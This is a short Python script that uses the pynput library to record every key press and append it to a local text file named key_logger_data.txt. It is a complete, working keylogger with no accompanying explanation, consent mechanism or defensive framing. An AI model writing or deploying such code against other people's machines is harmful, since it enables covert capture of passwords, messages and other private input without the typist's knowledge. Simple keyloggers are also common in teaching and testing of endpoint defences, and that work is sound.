from pynput.keyboard import Listener

def log_pressed_keys(key_pressed):
    key_log=str(key_pressed)
    key_log=key_log.replace("'","")
    with open('key_logger_data.txt','a') as key_log_file:
        key_log_file.write(key_log)

with Listener(on_press=log_pressed_keys) as key_listen:
    key_listen.join()
